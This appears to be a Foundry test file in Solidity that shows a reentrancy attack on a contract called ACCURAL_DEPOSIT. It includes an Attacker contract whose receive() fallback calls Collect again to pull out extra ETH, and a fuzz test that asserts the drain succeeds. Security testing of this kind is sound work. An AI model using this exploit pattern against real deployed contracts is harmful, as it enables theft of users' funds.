
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ACCURAL_DEPOSIT, LogFile} from "../src/ACCURAL_DEPOSIT.sol";

contract TestReentrancyACCURAL_DEPOSIT is Test {

    ACCURAL_DEPOSIT public _contractUnderTest;
    LogFile public logFile;
    Attacker public _attacker;

    function setUp() public {
        logFile = new LogFile();
        _contractUnderTest = new ACCURAL_DEPOSIT();
        _contractUnderTest.SetLogFile(address(logFile));
        _contractUnderTest.Initialized();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        uint256 minSum = _contractUnderTest.MinSum();
        vm.assume(attackVal > 0 && attackVal < minSum);

        // --- 2. State Configuration (Pre-Condition) ---
        

        // --- 3. Funding ---
        uint256 depositVal = minSum + attackVal;
        
        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        // B. Fund the Attacker (redundancy)
        vm.deal(address(_attacker), attackVal * 2 + minSum);

        // C. CRITICAL: Fund the Test Contract (address(this))
        // The test contract needs funds because it sends 'attackVal' to the Attacker in the setup step below.
        // Without this, the test will fail with 'EvmError: OutOfFunds' if attackVal > default test balance.
        vm.deal(address(this), attackVal * 2);
        
        
        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    // Keep this so the test contract can receive Ether from the contract being tested on the "positive" scenario
    receive() external payable {}
}

contract Attacker {
    ACCURAL_DEPOSIT public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public mainWithdraw;
    uint256 public extraWithdraw;

    constructor(address victimAddress) { 
        victim = ACCURAL_DEPOSIT(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        uint256 minSum = victim.MinSum();
        uint256 deposit = minSum + msg.value;
        mainWithdraw = minSum;
        extraWithdraw = val;
        
        victim.Deposit{value: deposit}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        initialSnapshot = address(this).balance;

        // 3. Call the vulnerable function.
        victim.Collect(mainWithdraw);

        // 4. Verify Success Conditions.
        uint256 finalBal = address(this).balance;
        if (finalBal == initialSnapshot + mainWithdraw + extraWithdraw) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(extraWithdraw);
        }
    }
}
